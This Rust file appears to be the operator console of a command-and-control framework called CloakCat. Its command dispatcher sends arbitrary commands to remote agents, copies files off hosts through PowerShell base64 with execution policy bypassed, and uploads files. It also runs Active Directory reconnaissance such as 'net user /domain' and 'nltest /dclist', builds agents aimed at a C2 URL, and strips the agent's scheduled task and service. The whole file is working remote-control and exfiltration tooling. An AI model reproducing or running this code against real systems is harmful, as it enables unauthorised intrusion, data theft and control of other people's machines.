//! REPL command dispatch and handlers.

use std::path::PathBuf;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use anyhow::{anyhow, Result};
use base64::Engine;
use reqwest::blocking::Client;

use crate::build::{build_agent, BuildAgentArgs, Os};
use crate::http::{
    attack_once, fetch_tags, resolve_agent_identifier, run_command_and_get_stdout, update_tags,
};
use crate::output::{print_agents, print_agents_with_tags, print_audit, print_history, print_json};
use crate::types::AgentInfo;

pub enum Flow {
    Continue,
    Quit,
}

fn remote_path_to_ps_b64(path: &str) -> Result<String> {
    let escaped = path.replace('\'', "''");
    let cmd = format!(
        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{}'))\"",
        escaped
    );
    Ok(cmd)
}

fn follow_results(
    cli: &Client,
    base: &str,
    agent: &str,
    interval_s: u64,
    cancel: Arc<AtomicBool>,
) -> Result<()> {
    println!("following results for agent={agent} (Ctrl+C to stop)...");
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();

    while !cancel.load(Ordering::SeqCst) {
        let res = cli
            .get(format!("{base}/v1/admin/results?agent_id={agent}&limit=200"))
            .send()?;
        let text = res.text()?;
        let v: serde_json::Value = serde_json::from_str(&text)?;
        let arr = v.as_array().ok_or_else(|| anyhow!("bad json from server"))?;
        for item in arr {
            let cmd_id = item.get("cmd_id").and_then(|x| x.as_str()).unwrap_or("").to_string();
            if cmd_id.is_empty() || seen.contains(&cmd_id) {
                continue;
            }
            seen.insert(cmd_id.clone());
            let exit = item.get("exit_code").and_then(|x| x.as_i64()).unwrap_or(0);
            let stdout = item.get("stdout").and_then(|x| x.as_str()).unwrap_or("");
            println!("\n[{}] exit={} stdout={}", cmd_id, exit, stdout);
        }
        for _ in 0..interval_s {
            if cancel.load(Ordering::SeqCst) {
                break;
            }
            thread::sleep(Duration::from_secs(1));
        }
    }
    println!("(stopped)");
    Ok(())
}

pub fn dispatch(
    cli: &Client,
    base: &str,
    line: &str,
    cancel: Arc<AtomicBool>,
) -> Result<Flow> {
    let mut parts = shell_words::split(line).map_err(|e| anyhow!("parse: {e}"))?;
    if parts.is_empty() {
        return Ok(Flow::Continue);
    }
    let cmd = parts.remove(0).to_lowercase();

    match cmd.as_str() {
        "help" | "h" => {
            println!(
                "commands:
  agents
  attack <AGENT_ID|ALIAS> <COMMAND...>
  results <AGENT_ID|ALIAS> [--limit N]
  tail <AGENT_ID|ALIAS> [--interval SEC]    # follow recent results; Ctrl+C to stop
  download-small <AGENT_ID|ALIAS> <REMOTE_PATH> <LOCAL_PATH>    # download small file via PowerShell base64
  upload-small <AGENT_ID|ALIAS> <LOCAL_PATH> <REMOTE_PATH>    # upload small file via PowerShell base64
  recon-low <AGENT_ID|ALIAS>      # low-noise recon for Windows
  recon-noisy <AGENT_ID|ALIAS>    # noisy AD recon (whoami /all, net user /domain, nltest /dclist)
  history <AGENT_ID|ALIAS> [--limit N]    # show recent results timeline for agent
  audit [--limit N] [--actor NAME] [--agent AGENT_ID|ALIAS]    # show audit log
  cleanup-windows <AGENT_ID|ALIAS>    # try to stop and remove CloakCat agent on Windows host
  hostinfo <AGENT_ID|ALIAS>    # basic host information (Windows)
  netinfo <AGENT_ID|ALIAS>     # basic network information (Windows)
  tags <AGENT_ID|ALIAS>                       # show tags
  tag-add <AGENT_ID|ALIAS> <TAG>              # add a tag
  tag-remove <AGENT_ID|ALIAS> <TAG>           # remove a tag
  agents-tags [TAG]                           # list agents, optionally filtered by tag
  build-agent --os <OS> --alias <ALIAS> --c2-url <URL> --profile <PROFILE> --shared-token <TOKEN> --output-dir <DIR> --name <NAME> [--note <NOTE>]
  quit | exit
env:
  C2_BASE=http://127.0.0.1:3000"
            );
        }

        "agents" => {
            let res = cli.get(format!("{base}/v1/admin/agents")).send()?;
            let text = res.text()?;
            if let Err(e) = print_agents(&text) {
                eprintln!("failed to parse agents list: {e}");
                print_json(text);
            }
        }

        "attack" => {
            if parts.len() < 2 {
                return Err(anyhow!("usage: attack <AGENT_ID> <COMMAND...>"));
            }
            let agent = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent)?;
            let command = parts.join(" ");
            attack_once(cli, base, &agent_id, &command)?;
        }

        "download-small" => {
            if parts.len() < 3 {
                return Err(anyhow!(
                    "usage: download-small <AGENT_ID|ALIAS> <REMOTE_PATH> <LOCAL_PATH>"
                ));
            }
            let agent_input = parts.remove(0);
            let remote_path = parts.remove(0);
            let local_path = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;

            let stdout_b64 = run_command_and_get_stdout(
                cli,
                base,
                &agent_id,
                &remote_path_to_ps_b64(&remote_path)?,
            )?;
            let trimmed = stdout_b64.trim();
            let decoded = base64::engine::general_purpose::STANDARD
                .decode(trimmed)
                .map_err(|e| anyhow!("base64 decode failed: {e}"))?;
            std::fs::write(&local_path, &decoded)?;
            println!("Saved {} bytes to {}", decoded.len(), local_path);
        }

        "upload-small" => {
            if parts.len() < 3 {
                return Err(anyhow!(
                    "usage: upload-small <AGENT_ID|ALIAS> <LOCAL_PATH> <REMOTE_PATH>"
                ));
            }
            let agent_input = parts.remove(0);
            let local_path = parts.remove(0);
            let remote_path = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;

            let data = std::fs::read(&local_path)
                .map_err(|e| anyhow!("failed to read {}: {}", local_path, e))?;
            if data.len() > 1_000_000 {
                return Err(anyhow!("file too large (>1MB): {}", local_path));
            }
            let b64 = base64::engine::general_purpose::STANDARD.encode(&data);

            let escaped_remote = remote_path.replace('\'', "''");
            let cmd = format!(
                "powershell -NoProfile -ExecutionPolicy Bypass -Command \"[IO.File]::WriteAllBytes('{remote}', [Convert]::FromBase64String(\\\"{b64}\\\"))\"",
                remote = escaped_remote,
                b64 = b64
            );

            attack_once(cli, base, &agent_id, &cmd)?;
            println!(
                "uploaded {} ({} bytes) to {}:{}",
                local_path, data.len(), agent_id, remote_path
            );
        }

        "recon-low" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: recon-low <AGENT_ID|ALIAS>"));
            }
            let agent_input = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;
            let cmds = [
                "whoami",
                "echo %USERNAME% %USERDOMAIN% %LOGONSERVER%",
                "systeminfo /fo csv /nh",
            ];
            for cmd in cmds {
                println!("[recon-low] {} -> {}", agent_id, cmd);
                if let Err(e) = attack_once(cli, base, &agent_id, cmd) {
                    eprintln!("[recon-low] command failed: {e}");
                }
            }
        }

        "recon-noisy" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: recon-noisy <AGENT_ID|ALIAS>"));
            }
            let agent_input = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;
            let cmds = ["whoami /all", "net user /domain", "nltest /dclist"];
            for cmd in cmds {
                println!("[recon-noisy] {} -> {}", agent_id, cmd);
                if let Err(e) = attack_once(cli, base, &agent_id, cmd) {
                    eprintln!("[recon-noisy] command failed: {e}");
                }
            }
        }

        "alias" => {
            if parts.len() < 2 {
                return Err(anyhow!("usage: alias <AGENT_ID> <ALIAS...>"));
            }
            let agent = parts.remove(0);
            let alias = parts.join(" ");
            let res = cli
                .post(format!("{base}/v1/admin/agents/{agent}/alias"))
                .json(&serde_json::json!({ "alias": alias, "note": serde_json::Value::Null }))
                .send()?;
            if res.status().is_success() {
                println!("updated alias: {agent} -> {alias}");
            } else {
                let body = res.text().unwrap_or_default();
                return Err(anyhow!("alias update failed: {}", body));
            }
        }

        "results" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: results <AGENT_ID> [--limit N]"));
            }
            let agent_input = parts.remove(0);
            let agent = resolve_agent_identifier(cli, base, &agent_input)?;
            let mut limit = 20usize;
            let mut i = 0;
            while i < parts.len() {
                if parts[i] == "--limit" && i + 1 < parts.len() {
                    limit = parts[i + 1].parse().unwrap_or(20);
                    i += 2;
                } else {
                    i += 1;
                }
            }
            let res = cli
                .get(format!("{base}/v1/admin/results?agent_id={agent}&limit={limit}"))
                .send()?;
            print_json(res.text()?);
        }

        "history" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: history <AGENT_ID|ALIAS> [--limit N]"));
            }
            let agent_input = parts.remove(0);
            let agent = resolve_agent_identifier(cli, base, &agent_input)?;
            let mut limit = 20usize;
            let mut i = 0;
            while i < parts.len() {
                if parts[i] == "--limit" && i + 1 < parts.len() {
                    limit = parts[i + 1].parse().unwrap_or(20);
                    i += 2;
                } else {
                    i += 1;
                }
            }
            let res = cli
                .get(format!("{base}/v1/admin/results?agent_id={agent}&limit={limit}"))
                .send()?;
            let status = res.status();
            let text = res.text()?;
            if !status.is_success() {
                return Err(anyhow!("history fetch failed: status={} body={}", status, text));
            }
            print_history(&text)?;
        }

        "audit" => {
            let mut limit: i64 = 50;
            let mut actor: Option<String> = None;
            let mut agent: Option<String> = None;
            let mut i = 0;
            while i < parts.len() {
                match parts[i].as_str() {
                    "--limit" if i + 1 < parts.len() => {
                        limit = parts[i + 1].parse().unwrap_or(50);
                        i += 2;
                    }
                    "--actor" if i + 1 < parts.len() => {
                        actor = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    "--agent" if i + 1 < parts.len() => {
                        agent = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    _ => i += 1,
                }
            }

            let agent_resolved = if let Some(a) = agent {
                Some(resolve_agent_identifier(cli, base, &a)?)
            } else {
                None
            };

            let mut qs: Vec<String> = vec![format!("limit={}", limit)];
            if let Some(a) = &actor {
                qs.push(format!("actor={}", urlencoding::encode(a)));
            }
            if let Some(agent_id) = &agent_resolved {
                qs.push(format!("agent_id={}", urlencoding::encode(agent_id)));
            }
            let url = format!("{}/v1/admin/audit?{}", base, qs.join("&"));

            let res = cli.get(url).send()?;
            let status = res.status();
            let text = res.text()?;
            if !status.is_success() {
                return Err(anyhow!("audit fetch failed: status={} body={}", status, text));
            }
            print_audit(&text)?;
        }

        "cleanup-windows" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: cleanup-windows <AGENT_ID|ALIAS>"));
            }
            let agent_input = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;

            const PROC_NAME: &str = "cloakcat-agent";
            const FOLDER: &str = r"C:\ProgramData\CloakCat";
            const TASK_NAME: &str = "CloakCatAgent";
            const SERVICE_NAME: &str = "CloakCatAgent";

            let cmds = [
                format!(
                    "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Stop-Process -Name '{proc}' -ErrorAction SilentlyContinue; Remove-Item '{folder}' -Recurse -Force -ErrorAction SilentlyContinue\"",
                    proc = PROC_NAME,
                    folder = FOLDER,
                ),
                format!(r#"schtasks /Delete /TN "{task}" /F"#, task = TASK_NAME),
                format!("sc delete {}", SERVICE_NAME),
            ];

            for cmd in cmds {
                println!(r#"[cleanup] agent={} cmd="{}""#, agent_id, cmd);
                if let Err(e) = attack_once(cli, base, &agent_id, &cmd) {
                    eprintln!("[cleanup] failed: {}", e);
                }
            }

            println!("cleanup-windows finished for {}", agent_id);
        }

        "hostinfo" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: hostinfo <AGENT_ID|ALIAS>"));
            }
            let agent_input = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;
            let cmds = ["hostname", "whoami", "systeminfo /fo csv /nh"];
            for cmd in cmds {
                println!(r#"[hostinfo] {} -> "{}""#, agent_id, cmd);
                if let Err(e) = attack_once(cli, base, &agent_id, cmd) {
                    eprintln!("[hostinfo] command failed: {}", e);
                }
            }
        }

        "netinfo" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: netinfo <AGENT_ID|ALIAS>"));
            }
            let agent_input = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;
            let cmds = [
                "ipconfig /all",
                "route print",
                r#"type C:\Windows\System32\drivers\etc\hosts"#,
            ];
            for cmd in cmds {
                println!(r#"[netinfo] {} -> "{}""#, agent_id, cmd);
                if let Err(e) = attack_once(cli, base, &agent_id, cmd) {
                    eprintln!("[netinfo] command failed: {}", e);
                }
            }
        }

        "tags" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: tags <AGENT_ID|ALIAS>"));
            }
            let agent_input = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;
            let tags = fetch_tags(cli, base, &agent_id)?;
            println!("tags: {}", tags.join(", "));
        }

        "tag-add" => {
            if parts.len() < 2 {
                return Err(anyhow!("usage: tag-add <AGENT_ID|ALIAS> <TAG>"));
            }
            let agent_input = parts.remove(0);
            let tag = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;
            let mut tags = fetch_tags(cli, base, &agent_id)?;
            if !tags.contains(&tag) {
                tags.push(tag.clone());
            }
            update_tags(cli, base, &agent_id, &tags)?;
            println!("updated tags: {}", tags.join(", "));
        }

        "tag-remove" => {
            if parts.len() < 2 {
                return Err(anyhow!("usage: tag-remove <AGENT_ID|ALIAS> <TAG>"));
            }
            let agent_input = parts.remove(0);
            let tag = parts.remove(0);
            let agent_id = resolve_agent_identifier(cli, base, &agent_input)?;
            let mut tags = fetch_tags(cli, base, &agent_id)?;
            tags.retain(|t| t != &tag);
            update_tags(cli, base, &agent_id, &tags)?;
            println!("updated tags: {}", tags.join(", "));
        }

        "agents-tags" => {
            let filter_tag = if parts.is_empty() {
                None
            } else {
                Some(parts.remove(0))
            };
            let res = cli.get(format!("{base}/v1/admin/agents")).send()?;
            let text = res.text()?;
            let agents: Vec<AgentInfo> = serde_json::from_str(&text)?;
            let filtered: Vec<AgentInfo> = if let Some(tag) = filter_tag.as_ref() {
                agents
                    .into_iter()
                    .filter(|a| a.tags.iter().any(|t| t == tag))
                    .collect()
            } else {
                agents
            };
            print_agents_with_tags(filtered);
        }

        "build-agent" => {
            let mut os: Option<Os> = None;
            let mut alias = None;
            let mut c2_url = None;
            let mut profile = None;
            let mut shared_token = None;
            let mut output_dir: Option<PathBuf> = None;
            let mut name = None;
            let mut note: Option<String> = None;

            let mut i = 0;
            while i < parts.len() {
                match parts[i].as_str() {
                    "--os" if i + 1 < parts.len() => {
                        os = Some(Os::from_str(&parts[i + 1]).map_err(|e: String| anyhow!("{}", e))?);
                        i += 2;
                    }
                    "--alias" if i + 1 < parts.len() => {
                        alias = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    "--c2-url" if i + 1 < parts.len() => {
                        c2_url = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    "--profile" if i + 1 < parts.len() => {
                        profile = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    "--shared-token" if i + 1 < parts.len() => {
                        shared_token = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    "--output-dir" if i + 1 < parts.len() => {
                        output_dir = Some(PathBuf::from(parts[i + 1].clone()));
                        i += 2;
                    }
                    "--name" if i + 1 < parts.len() => {
                        name = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    "--note" if i + 1 < parts.len() => {
                        note = Some(parts[i + 1].clone());
                        i += 2;
                    }
                    _ => i += 1,
                }
            }

            let usage = "usage: build-agent --os <OS> --alias <ALIAS> --c2-url <URL> --profile <PROFILE> --shared-token <TOKEN> --output-dir <DIR> --name <NAME> [--note <NOTE>]";
            let args = match (os, alias, c2_url, profile, shared_token, output_dir, name) {
                (Some(os), Some(a), Some(c), Some(p), Some(t), Some(d), Some(n)) => BuildAgentArgs {
                    os,
                    alias: a,
                    c2_url: c,
                    profile: p,
                    shared_token: t,
                    output_dir: d,
                    name: n,
                    note,
                },
                _ => return Err(anyhow!(usage)),
            };

            build_agent(args)?;
        }

        "tail" => {
            if parts.is_empty() {
                return Err(anyhow!("usage: tail <AGENT_ID> [--interval SEC]"));
            }
            let agent_input = parts.remove(0);
            let agent = resolve_agent_identifier(cli, base, &agent_input)?;
            let mut interval = 2u64;
            let mut i = 0;
            while i < parts.len() {
                if parts[i] == "--interval" && i + 1 < parts.len() {
                    interval = parts[i + 1].parse().unwrap_or(2);
                    i += 2;
                } else {
                    i += 1;
                }
            }
            cancel.store(false, Ordering::SeqCst);
            follow_results(cli, base, &agent, interval, cancel.clone())?;
        }

        "quit" | "exit" => return Ok(Flow::Quit),

        _ => eprintln!("unknown command: {cmd}. type 'help'"),
    }
    Ok(Flow::Continue)
}
